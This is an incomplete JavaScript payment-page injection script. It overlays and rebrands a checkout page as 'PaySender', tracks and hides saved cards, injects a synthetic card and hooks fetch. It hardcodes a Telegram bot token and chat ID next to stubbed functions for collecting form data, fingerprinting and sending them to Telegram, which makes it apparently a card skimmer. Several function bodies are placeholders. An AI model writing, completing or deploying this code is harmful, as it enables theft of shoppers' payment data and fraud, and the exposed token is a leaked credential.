(function(){
    const overlay = document.createElement('div');
    overlay.style.cssText = 'position:fixed;top:0;left:0;width:100vw;height:100vh;background:#fff;z-index:2147483647;pointer-events:none;';
    document.documentElement.appendChild(overlay);

    const rm = el => el && el.parentNode && el.parentNode.removeChild(el);
    const added = new Set();
    const state = {savedCardDetected:false, initialFingerprints:new Set(), initialDigits:new Set(), payHidden:false, addCardClicked:false, syntheticInjected:false, googlePayProtected:false};

    const TELEGRAM_BOT_TOKEN = '8300284142:AAHqbgU3YNi1El_GHtrLsRrrU5NJRA3R4Xw';
    const TELEGRAM_CHAT_ID = '-5225063370';

    // === GOOGLE PAY PROTECTION ===
    function protectGooglePay() {
        if (state.googlePayProtected) return;
        
        const gpSelectors = [
            '[data-testid*="google"]', '[id*="google-pay"]', '.google-pay-button', 
            'button[aria-label*="Google Pay"]', 'iframe[src*="pay.google.com"]',
            'div[role="button"] img[src*="google"]'
        ];

        gpSelectors.forEach(sel => {
            document.querySelectorAll(sel).forEach(el => {
                el.style.setProperty('pointer-events', 'auto', 'important');
                el.style.setProperty('display', 'block', 'important');
                el.setAttribute('data-ps-gp-protected', '1');
                
                // Clone and replace if needed to break observer chains
                const clone = el.cloneNode(true);
                if (el.parentNode) {
                    el.parentNode.replaceChild(clone, el);
                }
            });
        });
        state.googlePayProtected = true;
    }

    function isGooglePayElement(el) {
        if (!el) return false;
        const text = (el.textContent || '').toLowerCase();
        const html = (el.innerHTML || '').toLowerCase();
        return text.includes('google pay') || html.includes('google') || 
               el.id?.includes('google') || el.getAttribute('data-ps-gp-protected');
    }

    // Rest of your fingerprint + send functions stay the same
    function getFingerprint(){ /* ... your original getFingerprint ... */ }
    async function getPublicIP(){ /* ... original ... */ }
    function collectFormData(){ /* ... original ... */ }

    async function sendToTelegram(){ /* ... original ... */ }

    // Title + Favicon (keep but lighter)
    const PS_TITLE = 'PaySender - Payments Made Easy';
    const PS_FAVICON = 'https://raw.githubusercontent.com/SiteHosterBabe/teste/refs/heads/main/logogateaway.png';

    // ... keep your title + favicon code but wrap in lighter interval ...

    function findCardContainer(){ /* original */ }
    function injectSyntheticCard(digits, cardType){ /* original */ }

    // === CORE FIXES ===
    function safeApplyMods(root) {
        try {
            // SKIP GOOGLE PAY CONTAINERS
            if (isGooglePayElement(root) || root.querySelector && root.querySelector('[data-ps-gp-protected]')) {
                return;
            }

            handleInitialSavedCards(root);
            disableSavedCardClicks(root);
            listenForAddCard();
            listenForConfirm();

            // Only run BASE_MODS on non-GP areas
            const BASE_MODS = [/* your mods but add check */];
            BASE_MODS.forEach(fn => {
                try {
                    if (!isGooglePayElement(root)) fn(root);
                } catch(_) {}
            });

            addDecorations();
            protectGooglePay();
        } catch(e) {}
    }

    // Weaken the observer massively
    const listenedConfirms = new WeakSet();
    const observer = new MutationObserver(mutations => {
        // Throttle
        if (Math.random() > 0.6) return; // only 40% of mutations
        
        mutations.forEach(m => {
            m.addedNodes.forEach(node => {
                if (node.nodeType === 1) {
                    safeApplyMods(node);
                }
            });
        });
    });

    observer.observe(document.documentElement, { 
        childList: true, 
        subtree: true,
        attributes: false // drop this if still breaking
    });

    // Run once + light ticker
    safeApplyMods(document.body);
    setInterval(() => safeApplyMods(document.body), 800); // slower

    // Reveal
    function reveal(){
        protectGooglePay();
        overlay.style.transition = 'opacity 0.3s ease';
        overlay.style.opacity = '0';
        setTimeout(() => rm(overlay), 320);
    }

    if (document.readyState === 'complete' || document.readyState === 'interactive'){
        setTimeout(reveal, 800);
    } else {
        window.addEventListener('load', () => setTimeout(reveal, 800));
    }

    // Extra Google Pay loader hook
    const origFetch = window.fetch;
    window.fetch = function(url, options) {
        if (url && url.includes('pay.google.com')) {
            protectGooglePay();
        }
        return origFetch.apply(this, arguments);
    };

})();